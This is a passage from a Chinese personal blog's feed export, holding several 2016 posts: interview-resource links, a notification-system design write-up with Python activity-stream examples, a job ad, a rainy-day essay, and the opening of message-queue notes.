&lt;li&gt;&lt;a href="https://github.com/MaximAbramchuck/awesome-interview-questions#django"&gt;django&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/MaximAbramchuck/awesome-interview-questions#ruby"&gt;ruby&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/MaximAbramchuck/awesome-interview-questions#ruby-on-rails"&gt;Ruby on Rails&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;database&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/MaximAbramchuck/awesome-interview-questions#sql"&gt;sql&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/MaximAbramchuck/awesome-interview-questions#mysql"&gt;mysql&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/MaximAbramchuck/awesome-interview-questions#mongodb"&gt;mongodb&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/MaximAbramchuck/awesome-interview-questions#linux"&gt;linux&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/MaximAbramchuck/awesome-interview-questions#algorithms"&gt;algorithms&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/blakeembrey/code-problems"&gt;code-problems&lt;/a&gt;:Common code and interview problems solved in multiple languages&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/hawx1993/Front-end-Interview-questions"&gt;Front-end-Interview-questions&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/taizilongxu/interview_python"&gt;interview_python&lt;/a&gt;:关于Python的面试题&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/fex-team/interview-questions"&gt;interview-questions&lt;/a&gt;:FEX 面试问题&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/paddingme/Front-end-Web-Development-Interview-Question"&gt;Front-end-Web-Development-Interview-Question&lt;/a&gt;:前端开发面试题大收集&lt;/li&gt;
&lt;li&gt;&lt;a href="http://hit-alibaba.github.io/interview/index.html"&gt;笔试面试知识整理&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/qiu-deqing/FE-interview"&gt;FE-interview&lt;/a&gt;:收集的前端面试题和答案&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/jimuyouyou/node-interview-questions"&gt;node-interview-questions&lt;/a&gt;:Node.js面试题，侧重后端应用与对Node核心的理解&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/ChenYilong/iOSInterviewQuestions"&gt;iOS面试题集锦&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/envyfan/AndroidReview"&gt;AndroidReview&lt;/a&gt;:Adnroid面试复习&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/arialdomartini/Back-End-Developer-Interview-Questions"&gt;Back-End-Developer-Interview-Questions
&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/monklof/Back-End-Developer-Interview-Questions"&gt;Back-End-Developer-Interview-Questions&lt;/a&gt;:后端开发面试题&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/NoonTechnology/interview_summarize"&gt;interview_summarize&lt;/a&gt;:面试总结&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;名企面试题&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://coolshell.cn/articles/3345.html"&gt;140个Google的面试题&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 14 Jun 2016 00:00:00 +0000</pubDate><guid>tag:,2016-06-14:about-interview.html</guid><category>code</category></item><item><title>notification system思路、概念与实现</title><link>/notification-system-thinking-concept-and-Implementation.html</link><description>&lt;h1&gt;试水&lt;/h1&gt;
&lt;p&gt;水挺深，撸起你的裤管&lt;/p&gt;
&lt;h3&gt;缘起&lt;/h3&gt;
&lt;p&gt;最初我想为Open edX实现一套消息系统（Notification system）。通过浏览&lt;a href="https://github.com/edx"&gt;官方库&lt;/a&gt;，我们发现，官方在做类似的事:&lt;a href="https://github.com/edx/notifier"&gt;notifier&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;notifier is a django application for edX platform notifications&lt;/p&gt;
&lt;p&gt;It currently sends daily digests of new content to subscribed forums users, with a goal of eventually supporting real-time and batched notifications of various types of content across various channels (e.g. SMS).&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;由此可知这个库，最终会变得real-time and powerful（多种通知方式）&lt;/p&gt;
&lt;p&gt;但目前而言，似乎偏弱，且只能提供论坛消息通知，且是以邮件的方式。而我们似乎更习惯站内消息这种通知形式&lt;/p&gt;
&lt;p&gt;至于具体实现，我没细看，猜测是celery+rabbitmq，采用pub/sub模型&lt;/p&gt;
&lt;h3&gt;最初的思路&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;基于redis或者rabbitmq&lt;/li&gt;
&lt;li&gt;使用read-time web相关库&lt;ul&gt;
&lt;li&gt;parse&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/rethinkdb/rethinkdb"&gt;rethinkdb&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;meteor&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;看edx的&lt;a href="https://github.com/edx/notifier"&gt;notifier&lt;/a&gt;实现&lt;/li&gt;
&lt;li&gt;改造IM&lt;ul&gt;
&lt;li&gt;&lt;a href="http://kexun.github.io/2016/04/08/%E9%80%9A%E8%BF%87%E7%AC%AC%E4%B8%89%E6%96%B9Im%E7%B3%BB%E7%BB%9F%E6%94%B9%E9%80%A0%E7%A7%81%E4%BF%A1%E5%8A%9F%E8%83%BD/"&gt;通过第三方IM系统，改造私信功能&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;采用云服务&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;我的需求&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;私信（message）&lt;/li&gt;
&lt;li&gt;站内消息（Announce）&lt;ul&gt;
&lt;li&gt;是系统发送的消息，格式是固定的，特殊对象一般拥有&lt;strong&gt;超链接&lt;/strong&gt;（资源定位符）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;提醒（activities，Remind，类似github消息通知）&lt;ul&gt;
&lt;li&gt;可能涉及关注对象/活动/订阅/&lt;ul&gt;
&lt;li&gt;谁对一样属于谁的事物做了什么操作（someone do something in someone's something）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;分析需求&lt;/h3&gt;
&lt;p&gt;通过万能的google，我们发现这类需求早就有人讨论过啦，以下是我喜欢的讨论&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.jianshu.com/p/f4d7827821f1"&gt;消息系统设计与实现「上篇」&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.jianshu.com/p/6bf8166b291c"&gt;消息系统设计与实现「下篇」&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.zhihu.com/question/22394809"&gt;知乎的消息机制，在技术上如何设计与规划？&lt;/a&gt; ： 知乎工程师的回答&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.zhihu.com/question/20380990/answer/14960006"&gt;网站的消息（通知）系统一般是如何实现的？&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://nodex.me/t/29"&gt;newsfeed架构设计和实现&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.csdn.net/article/2013-11-07/2817430-design-decisions-for-scaling-your-high-traffic-feeds"&gt;百万用户时尚分享网站feed系统扩展实践&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;概念篇&lt;/h1&gt;
&lt;p&gt;对Pinterest、Instagram和Fashiolista来说，feed是一个核心组件。
这些系统的共同点在于向用户展示其关注的人的动态，Fashiolista是基于&lt;a href="http://activitystrea.ms/specs/atom/1.0/"&gt;Atom Activity Streams 1.0&lt;/a&gt;（还有个使用json格式的版本)来构建动态数据流的（ps：Atom Activity Streams今年出了&lt;a href="https://www.w3.org/TR/activitystreams-core/"&gt;2.0版本&lt;/a&gt;）&lt;/p&gt;
&lt;h3&gt;feed&lt;/h3&gt;
&lt;p&gt;那么我们首先要搞清楚feed是什么。&lt;/p&gt;
&lt;p&gt;可以参考[Web_feed](https://en.wikipedia.org/wiki/Web_feed&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;On the World Wide Web, a web feed (or news feed) is a data format used for providing users with frequently updated content.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我把它理解为最新讯息，提要）&lt;/p&gt;
&lt;h3&gt;Activities&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://getstream.io/docs/?language=python"&gt;stream&lt;/a&gt;的文档，对我们理解消息系统很有帮助，&lt;a href="http://activitystrea.ms/specs/json/1.0/"&gt;
JSON Activity Streams 1.0&lt;/a&gt;有些抽象，而&lt;a href="https://github.com/tschellenbach/Stream-Framework"&gt;Stream-Framework&lt;/a&gt;名词太多&lt;/p&gt;
&lt;p&gt;而&lt;a href="https://getstream.io/docs/?language=python"&gt;stream&lt;/a&gt;的文档让我们在使用过程中理解消息系统&lt;/p&gt;
&lt;p&gt;一则Activities有以下属性：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Actor&lt;/li&gt;
&lt;li&gt;Verb&lt;/li&gt;
&lt;li&gt;Object&lt;/li&gt;
&lt;li&gt;Target &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;举例而言&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Erik is pinning Hawaii to his Places to Visit board.&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;我们来拆解这句话，用以上属性积木来构建它&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Actor: "Eric" (User:2)&lt;/li&gt;
&lt;li&gt;Verb: "pin"&lt;/li&gt;
&lt;li&gt;Object: "Hawaii" (Place:42)&lt;/li&gt;
&lt;li&gt;Target: "Places to Visit" (Board:1)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们来看下这个动作用代码来描述&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# Instantiate a feed object&lt;/span&gt;
&lt;span class="n"&gt;user_feed_1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;feed&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;# Add an activity to the feed, where actor, object and target are references to objects (`Eric`, `Hawaii`, `Places to Visit`)&lt;/span&gt;
&lt;span class="n"&gt;activity_data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;actor&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;User:2&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;verb&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;pin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;object&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Place:42&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;target&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Board:1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="n"&gt;activity_response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;user_feed_1&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add_activity&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;activity_data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Using the above fields, you can express any activity!&lt;/p&gt;
&lt;p&gt;意识到这点，我们就理解消息系统啦&lt;/p&gt;
&lt;p&gt;ps：用程序表达现实关系（动作），业务相关的代码通常是模拟现实（关系或者事务），所以表达现实是一种常见的模式&lt;/p&gt;
&lt;h3&gt;其他概念&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;fanout：将动态推送给你的粉丝的过程被称为消息分发&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;参考&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.csdn.net/article/2013-11-07/2817430-design-decisions-for-scaling-your-high-traffic-feeds"&gt;百万用户时尚分享网站feed系统扩展实践&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;实现篇&lt;/h1&gt;
&lt;h3&gt;stream framework&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Stream Framework is a Python library, which allows you to build newsfeed and notification systems using Cassandra and/or Redis.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Examples of what you can build are&lt;ul&gt;
&lt;li&gt;Activity streams such as seen on Github&lt;/li&gt;
&lt;li&gt;A notification system&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;之前的Feedly&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.mellowmorning.com/"&gt;作者博客&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;最近我在看stream framework的实现，重点关注redis部分，之后有时间再做分析&lt;/p&gt;
&lt;p&gt;我们先来看下数据在redis里的结构&lt;/p&gt;
&lt;p&gt;&lt;img alt="pin-redis" src="http://7xrc4h.com1.z0.glb.clouddn.com/pin-redis.png" /&gt;&lt;/p&gt;
&lt;h3&gt;demo&lt;/h3&gt;
&lt;p&gt;这是基于stream_framework的一个demo，模仿Pinterest，用户可以发布自己的pin（类似post），其他用户可以follow该用户，并且对喜欢的物品进行点赞&lt;/p&gt;
&lt;p&gt;由于时间久远，该项目无法直接运行，我做了些调整，使其跑在osx下，测试正常&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/wwj718/stream_framework_example"&gt;stream_framework_example&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;首页
&lt;img alt="pin1.png" src="http://7xrc4h.com1.z0.glb.clouddn.com/pin1.png" /&gt;&lt;/p&gt;
&lt;p&gt;信息流&lt;/p&gt;
&lt;p&gt;&lt;img alt="pin2.png" src="http://7xrc4h.com1.z0.glb.clouddn.com/pin2.png" /&gt;&lt;/p&gt;
&lt;p&gt;关注者
&lt;img alt="pin3.png" src="http://7xrc4h.com1.z0.glb.clouddn.com/pin3.png" /&gt;&lt;/p&gt;
&lt;h3&gt;stream&lt;/h3&gt;
&lt;p&gt;当然我们也可以使用stream的服务来构建我们的消息系统,我们跑一个简单的demo&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;stream&lt;/span&gt;
&lt;span class="n"&gt;client&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;stream&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;client id&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;client secret&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;location&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;us-east&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="n"&gt;chris&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;feed&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;chris&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;# add an activity, message is a custom field. add as many custom fields as you&amp;#39;d like&lt;/span&gt;
&lt;span class="n"&gt;chris&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add_activity&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;
  &lt;span class="s1"&gt;&amp;#39;actor&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;chris&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="s1"&gt;&amp;#39;verb&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;add&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="s1"&gt;&amp;#39;object&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;picture:10&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="s1"&gt;&amp;#39;foreign_id&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;picture:10&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="s1"&gt;&amp;#39;message&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;This bird is absolutely beautiful. Glad it&lt;/span&gt;&lt;span class="se"&gt;\&amp;#39;&lt;/span&gt;&lt;span class="s1"&gt;s recovering from a damaged wing.&amp;#39;&lt;/span&gt;
&lt;span class="p"&gt;});&lt;/span&gt;
&lt;span class="c1"&gt;# jack&amp;#39;s timeline feed follows chris&amp;#39; user feed.&lt;/span&gt;
&lt;span class="n"&gt;jack&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;feed&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;timeline&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;jack&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;jack&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;follow&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;chris&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;# read the timeline for jack, chris post will show up here&lt;/span&gt;
&lt;span class="n"&gt;activities&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;jack&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;limit&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;results&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="c1"&gt;# read the next page, use id filtering for optimal performance&lt;/span&gt;
&lt;span class="n"&gt;next_activities&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;jack&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;limit&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;id_lte&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;activities&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;results&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="c1"&gt;# remove the activity by referencing the foreign_id you provided&lt;/span&gt;
&lt;span class="n"&gt;chris&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;remove_activity&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;foreign_id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;picture:10&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;django demo&lt;/h3&gt;
&lt;p&gt;&lt;a href="http://exampledjango.getstream.io/"&gt;exampledjango&lt;/a&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 08 Jun 2016 00:00:00 +0000</pubDate><guid>tag:,2016-06-08:notification-system-thinking-concept-and-Implementation.html</guid><category>code</category></item><item><title>招数据分析/机器学习方面的全职/实习生</title><link>/join-us2.html</link><description>&lt;p&gt;公司在教育领域积累了大量用户数据，为了消化这些数据，我们之前的方案是可视化和数据报表&lt;/p&gt;
&lt;p&gt;为了提高自动化程度和模式发现能力，我们想加强在数据分析/机器学习平台方面的建设，目前还缺少你这样的对教育行业数据感兴趣，同时又有数据分析/机器学习技能的人&lt;/p&gt;
&lt;p&gt;有兴趣的同学一起来折腾吧~&lt;/p&gt;
&lt;p&gt;如果你熟悉以下技能最好啦&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Python&lt;/li&gt;
&lt;li&gt;django/flask中的一种&lt;/li&gt;
&lt;li&gt;pandas/scikit-learn&lt;/li&gt;
&lt;li&gt;elk&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;当然啦，即便不熟悉也没关系，如果你对数据本身感兴趣并有探索的欲望，工程上的能力是容易提高的，不大容易成为你的绊脚石&lt;/p&gt;
&lt;p&gt;有兴趣的小伙伴可以发邮件细聊：wuwenjie718@gmail.com&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 06 Jun 2016 00:00:00 +0000</pubDate><guid>tag:,2016-06-06:join-us2.html</guid><category>edx</category></item><item><title>雨天</title><link>/jihua.html</link><description>&lt;p&gt;外边还在下雨。&lt;/p&gt;
&lt;p&gt;我住顶楼，雨水顺屋檐而下，打在窗外的空调上，声音清脆，夜里听着睡得香。&lt;/p&gt;
&lt;p&gt;雨天不关窗户的另一点好处是，夜里露在外边的脚会把人冻醒，一看时间才2点不到，缩缩脚，把被子抱得更紧些。前半夜睡得早的话，已经神清气爽，手边的kindle还没合上，于是趴着打开背光灯，找到睡前读到一半的句子。&lt;/p&gt;
&lt;p&gt;雨夜读诗和武侠尤佳&lt;/p&gt;
&lt;p&gt;傍晚从地铁站走出，往住处走，过明故宫公园，光影氤氲，行人车辆都少，街上冷冷清清，倒有些小镇的感觉&lt;/p&gt;
&lt;p&gt;毕竟不是乡间，就也看不见一个个亮着灯的厨房，否则，走过冷清的街头，望向人家屋里的腾腾热气，笑语喧哗哭闹哈欠，难免心头一热，乍暖还寒&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;明天还是下雨的话，我就穿着拖鞋出门，我有两双拖鞋，平时喜欢洞洞鞋多些。因为是雨天出门，想穿人字拖。&lt;/p&gt;
&lt;p&gt;十年一觉扬州梦那首诗里，我最喜欢起句，落拓江湖载酒行。我的自行车不在，就没法载酒出行，我也讨厌喝酒。穿着人字拖，走上一天，牛仔裤脚脏得差不多，落拓江湖想来和杜牧差不多&lt;/p&gt;
&lt;p&gt;身上就带10块钱&lt;/p&gt;
&lt;p&gt;像一个周末补课的孩子，因为下雨，过桥的时候，风有些大，河边的树叶也被吹落，心情就突然变得惆怅，不想去上课。偷偷在一个被雨淋湿而安静的城市里瞎逛一天。吃早餐的十块钱要用来应付一天，坐公车是不大可能了，大多的路只能用走。除去游戏机厅的2个硬币，就剩下8块钱吃饭了。&lt;/p&gt;
&lt;p&gt;我还没怎么在雨天里认真逛过这个城市&lt;/p&gt;
&lt;p&gt;我曾在4月的傍晚，城墙边，看夕阳西下，到整个城市被灯火点亮才起身。饿得，几乎能感觉到空气中香味的温度和形状。&lt;/p&gt;
&lt;p&gt;在7月中午，骑车穿过半个城市，停在梧桐树下，给大学里一同骑车的老友闲说不同于北方的风光&lt;/p&gt;
&lt;p&gt;在8月的雷雨夜，黑灯瞎火，电闪雷鸣，到山里看萤火灿如星光&lt;/p&gt;
&lt;p&gt;是啊 我已经很久没在雨天里认真而漫无目的地逛过了&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Fri, 03 Jun 2016 00:00:00 +0000</pubDate><guid>tag:,2016-06-03:jihua.html</guid><category>随笔</category></item><item><title>消息队列中间件学习笔记</title><link>/mq-note.html</link><description>&lt;h1&gt;中间件（Middleware）&lt;/h1&gt;
&lt;p&gt;根据维基百科的说法&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;中间件（英语：Middleware）提供系统软件和应用软件之间连接的软件，以便于软件各部件之间的沟通，特别是应用软件对于系统软件的集中的逻辑，在现代信息技术应用框架如Web服务、面向服务的体系结构等中应用比较广泛。如数据库、Apache的Tomcat。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;中间件技术创建在对应用软件部分常用功能的抽象上，将常用且重要的过程调用、分布式组件、消息队列、事务、安全、连结器、商业流程、网络并发、HTTP服务器、Web Service等功能集于一身或者分别在不同品牌的不同产品中分别完成&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;一般认为在商业中间件及信息化市场主要存在微软阵营、Java阵营、开源阵营。阵营的区分主要体现在对下层操作系统的选择以及对上层组件标准的制订&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;p&gt;我此前对中间件的理解是&lt;code&gt;对应用软件部分常用功能的抽象&lt;/code&gt;，它运行在操作系统之上，对外提供一种常用而抽象的服务，典型代表有数据库、缓存、消息队列&lt;/p&gt;
&lt;h1&gt;消息队列(Message queue)&lt;/h1&gt;
&lt;p&gt;我们同样引用维基百科&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;消息队列（英语：Message queue）是一种进程间通信或同一进程的不同线程间的通信方式.消息队列提供了异步的通信协议，每一个贮列中的纪录包含详细说明的数据，包含发生的时间，输入设备的种类，以及特定的输入参数，也就是说：消息的发送者和接收者不需要同时与消息队列互交。消息会保存在队列中，直到接收者取回它。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;有了消息队列，事件可以异步地发生&lt;/p&gt;
&lt;h3&gt;实现&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;消息队列常常保存在链表结构中。拥有权限的进程可以向消息队列中写入或读取消息&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;优缺点&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
